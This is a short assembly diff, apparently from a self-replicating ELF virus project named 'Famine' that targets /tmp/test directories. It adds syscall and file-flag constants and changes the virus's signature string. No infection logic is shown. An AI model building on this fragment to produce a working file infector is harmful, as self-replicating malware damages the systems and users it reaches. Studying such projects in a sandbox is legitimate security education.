@@ -9,6 +9,9 @@
 %define SYS_MUNMAP      11
 %define SYS_GETPID      39
 %define SYS_EXIT        60
+%define SYS_RENAME      82
+%define SYS_UNLINK      87
+%define SYS_READLINK    89
 %define SYS_PTRACE      101
 %define SYS_GETDENTS64  217
 %define SYS_GETRANDOM   318
@@ -20,6 +23,8 @@
 %define O_RDONLY    0
 %define O_WRONLY	1
 %define O_RDWR      2
+%define O_CREAT     0x40
+%define O_TRUNC     0x200
 %define O_APPEND	    1024
 %define O_DIRECTORY     0x10000
 %define AT_FDCWD        -100
@@ -136,7 +141,7 @@ firstDir:       db "/", 0
 firstDir:       db "/tmp/test", 0
 %endif
 secondDir:      db "/tmp/test2", 0
-signature:      db "Famine version 1.0 (c)oded by <ocrossi>-<elaignel>", 0
-signature_len:  equ $ - signature - 1
+signature:      db "Famine version 1.0 (c)oded by <ocrossi>-<elaignel>"
+signature_len:  equ $ - signature
 msg_err_pt_load_close: db "add_pt_laod failed", 0
 msg_err_write_failed: db "process write failed", 0
